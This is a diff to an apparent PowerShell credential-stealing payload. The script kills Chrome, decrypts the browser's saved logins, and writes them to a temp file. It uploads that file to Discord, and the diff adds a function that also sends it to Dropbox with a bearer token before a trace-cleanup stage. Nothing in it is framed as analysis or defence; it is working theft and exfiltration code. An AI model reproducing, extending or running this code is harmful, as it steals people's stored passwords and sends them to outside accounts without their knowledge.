@@ -2,7 +2,7 @@
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
-#Stage 1 Obtain the credentials from the Chrome browsers User Data folder
+#Obtain the credentials from the Chrome browsers User Data folder
 
 #First we Kill Chrome just to be safe
 Stop-Process -Name Chrome
@@ -31,7 +31,7 @@ $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_
 echo $l >> $env:TMP\$FileName
 
 ######################################################################################################################
-#Stage 2 Upload to discord
+# Upload to discord
 
 function Upload-Discord {
 
@@ -56,7 +56,33 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$FileNam
 
 ######################################################################################################################
 
-#Stage 3 Cleanup Traces
+# Upload output file to Dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}
+
+####################################################################################################################
+
+# Cleanup Traces
 
 <#
 .NOTES 
